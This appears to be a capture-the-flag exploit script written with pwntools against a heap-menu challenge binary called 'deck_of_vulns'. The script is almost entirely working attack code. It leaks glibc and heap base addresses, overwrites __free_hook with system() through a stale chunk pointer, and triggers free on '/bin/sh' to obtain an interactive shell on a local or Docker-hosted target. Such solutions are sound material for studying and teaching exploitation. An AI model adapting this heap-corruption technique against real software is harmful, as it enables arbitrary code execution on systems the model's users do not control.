#!/usr/bin/env python
from pwn import *

context.log_level = "info"
# context.terminal = ["tmux", "splitw", "-h"]
context.terminal = ['urxvt', '-e', 'sh', '-c']
# context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

CURR_DIR = os.path.dirname(os.path.realpath(__file__))
PATH = CURR_DIR + "/distributed/bin/"
BINARY = "./deck_of_vulns"
HOST = "172.17.0.2"
PORT = 1337

# elf = ELF(BINARY, checksec=False)
uu64 = lambda x: u64(x.ljust(8, b"\x00"))
uu32 = lambda x: u32(x.ljust(4, "\x00"))

gdbscript = '''
b edit_vuln
command
heap chunks
heap bins
end
continue
'''

def attach(r):
    if type(r) == process:
        gdb.attach(r, gdbscript)


def add_vuln(size, desc):
    debug(b"adding vuln size " + size + b" content: " + desc)
    r.sendlineafter(b"choice: ", b"1")
    r.sendlineafter(b"How much space do you need for details? ", size)
    r.sendlineafter(b"Input details: ", desc)


def edit_vuln(desc):
    debug(b"editing vuln vuln content: " + desc)
    r.sendlineafter(b"choice: ", b"3")   
    r.sendlineafter(b"Input updated vulnerability details: ", desc)


def patch_vuln():
    r.sendlineafter(b"choice: ", b"2")


def flip_priority():
    r.sendlineafter(b"choice: ", b"5")


def show_vuln():
    r.sendlineafter(b"choice: ", b"4")
    r.recvuntil(b"vulnerability details:\n")
    b = r.recvuntil(b"What would you like to do?")
    return b[:-27]


def leak_libc_base_addr():
    add_vuln(b"2064", b"AAAAAAAA")
    add_vuln(b"2064", b"BBBBBBBB")
    flip_priority()
    patch_vuln()
    add_vuln(b"2064", b"CCCCCCCC")
    b = show_vuln()
    # extract relevant bytes
    b = b[len("CCCCCCC\n"):b.find(b"\x0a\x0a")]
    # unpack them
    addr = uu64(b)
    # libc base is at 0x198c00 offset so substract it
    return addr - 0x1bec0a


def leak_heap_base_addr():
    edit_vuln(b"AAAAAAA")
    b = show_vuln()
    # extract relevant bytes
    b = b[len("AAAAAAA\n"):b.find(b"\x0a\x0a")]
    # unpack them
    addr = uu64(b)
    # we overwrote 1 byte with a newline so lets leftshift 8 bits
    # addr = addr << 8
    # libc base is at 0x198c00 offset so substract it
    return addr - 0x422f0


def exploit():
    
    info("leaking glibc base address ...")
    libc_base_address = leak_libc_base_addr()
    success("leaked glibc base address: " + hex(libc_base_address))
    patch_vuln()
    patch_vuln()

    for idx in range(129):
        add_vuln(b"2064", b"AAAA" + bytes(str(idx), 'utf-8'))

    add_vuln(b"2064", b"CCCCCCCC")
    flip_priority()
    info("leaking heap base address ...")
    heap_base_address = leak_heap_base_addr()
    success("leaked heap base address: " + hex(heap_base_address))
    libc_system_address = libc_base_address + 0x49bc0
    success("calculated 'libc_system_address' address: " + hex(libc_system_address))
    free_hook_address = libc_base_address + 0x1c1b60
    success("calculated 'free_hook_address' address: " + hex(free_hook_address))

    info("overwriting pointer to free_hook_address ...")
    edit_vuln(p64(0x0000000000000810) + p64(free_hook_address))
    flip_priority()
    info("overwriting writing libc_system_address to free_hook_address ...")
    edit_vuln(p64(libc_system_address))
    flip_priority()
    info("writing '/bin/sh' to use as an argument to the free_hook function (now system) ...")
    edit_vuln(b"/bin/sh")
    info("executing free (system('/bin/sh') will execute)")
    patch_vuln()
    success("you should have a shell now ...")
    
    

if __name__ == '__main__':
    os.chdir(PATH)
    if len(sys.argv) > 1:
        r = remote(HOST, PORT)
        libc = ELF(PATH + "./libc.so.6", checksec=0)
    else:
        r = process(BINARY, env={'LD_PRELOAD': '"' + PATH + "./ld-2.32.so " + PATH + './libc.so.6' + '"'})
        libc = ELF(PATH + './libc.so.6', checksec=0)
        attach(r)

    exploit()
    r.interactive()
